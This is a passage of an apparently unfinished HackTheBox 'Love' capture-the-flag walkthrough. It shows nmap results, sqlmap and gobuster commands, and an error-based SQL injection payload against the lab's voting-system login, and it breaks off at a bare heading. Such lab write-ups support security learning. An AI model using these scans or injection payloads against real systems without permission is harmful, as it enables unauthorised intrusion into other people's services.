---
layout: post
title:  "HackTheBox: Love" 
description: Write up and complete walkthrough of HackTheBox's Love
---

**Overview**

# Initial Scan

```nmap
# Nmap 7.91 scan initiated Fri Jul  2 15:58:46 2021 as: nmap -sC -sV -oA nmap/love -v 10.10.10.239
Nmap scan report for 10.10.10.239
Host is up (0.095s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0 1add 5048 afc8 b3cf 7140 6e68 5ff6
|_SHA-1: 83ed 29c4 70f6 4036 a6f4 2d4d 4cf6 18a2 e9e4 96c2
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   RTSPRequest, SMBProgNeg, TerminalServer, ms-sql-s: 
|_    Host '10.10.14.11' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/2%Time=60DF7008%P=x86_64-pc-linux-gnu%r(RTS
SF:PRequest,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.11'\x20is\x20not\x2
SF:0allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SMBPro
SF:gNeg,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.11'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(TerminalSe
SF:rver,4A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.11'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ms-sql-s,4
SF:A,"F\0\0\x01\xffj\x04Host\x20'10\.10\.14\.11'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h45m56s, deviation: 4h02m31s, median: 25m54s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-02T13:25:08-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-02T20:25:07
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  2 15:59:20 2021 -- 1 IP address (1 host up) scanned in 33.84 seconds
```

- Port 80 (http) is open, running on an `Apache httpd 2.4.46` webserver.
- Port 135 (msrpc) is open.
- Port 139 and 445 are open, all three ports related to `SMB protocol`.
- Port 3306 (mysql) is open and running a `MySQL` database.
- Port 443 (https) is open and running an `Apache httpd 2.4.46` webserver.
- Port 5000 (http) is also open and is also running an instance of `Apache httpd 2.4.46` webserver.


# Webserver on port 80

On entering the website we are greeted with a login page:

![[Pasted image 20210702170608.png]]

Knowing that there is a mysql database running on the backend, this box will probably require some sort of sql injection. After trying out the initial typical vectors, I started up sqlmap on the background and continued poking myself.

Route the POST request over to `burpsuite` and copy the request into a file by sending it to the `repeater` and right clicking `Copy to file`. 

Then use sqlmap using the request file along with `--batch` and `--level` to let it run automatically at the given level. You can read more about levels and specific flags of sqlmap [here](https://github.com/sqlmapproject/sqlmap)
```bash
sudo sqlmap -r sql.req --batch --level 5
```

Along with sqlmap, it's good to have some sort of recon going for enumerating the website's possible other pages.

For this we could use `gobuster`, `ffuf`, `dirbuster`, etc.

```bash
gobuster dir -u http://10.10.10.239 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-words.txt -o gobuster.out
```

# SQLMap injection located

After some time, sqlmap was able to find a vulnerable point within the `voter` parameter:

```bash
sqlmap identified the following injection point(s) with a total of 904 HTTP(s) requests:
---
Parameter: voter (POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: voter=d'||(SELECT 0x77487063 WHERE 2146=2146 AND (SELECT 6518 FROM(SELECT COUNT(*),CONCAT(0x71717a7871,(SELECT (ELT(6518=6518,1))),0x7171707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&password=d&login=
---
```


# SQLi rabbit hole

After an unrealistic amount of time trying to make the sqli found by sqlmap to work, I decided to move on to try and find something else, as this was not achieving anything unfortunately.

# Ports 135